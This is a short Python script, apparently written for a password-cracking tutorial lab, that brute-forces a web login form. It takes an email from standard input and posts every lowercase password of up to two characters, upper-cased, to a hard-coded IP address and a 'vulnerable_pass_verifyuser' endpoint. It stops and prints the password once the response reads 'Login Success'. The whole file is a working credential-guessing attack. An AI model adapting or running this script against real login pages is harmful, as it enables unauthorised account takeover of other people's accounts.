from bs4 import BeautifulSoup
import requests, sys

# Read data from stdin
mail = sys.stdin.readline()
mail = mail.strip('"')

def try_pass(mail, pwd):
	session = requests.Session()
	r = session.get('http://162.210.88.93:3000/Password_tutorial', allow_redirects=False)
	soup = BeautifulSoup(r.text)
	action_url = '/vulnerable_pass_verifyuser'
	action_url = 'http://162.210.88.93:3000' + action_url
	post_data = {'email': '', 'password': ''}
	post_data['email'] = mail
	post_data['password'] = pwd.upper()

	return session.post(action_url, data=post_data)

#mail = 'joe@gmail.com'


char_set = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

found = False


def gen_pass(cur, set):
	global found
	if len(cur) > 2:
		return
	if found:
		return
	if try_pass(mail, cur).text == 'Login Success':
		print(cur)
		found = True
		return
	for s in set:
		gen_pass(cur + s, set)
	return

gen_pass('', char_set)
#print(try_pass(mail, 'password').text)
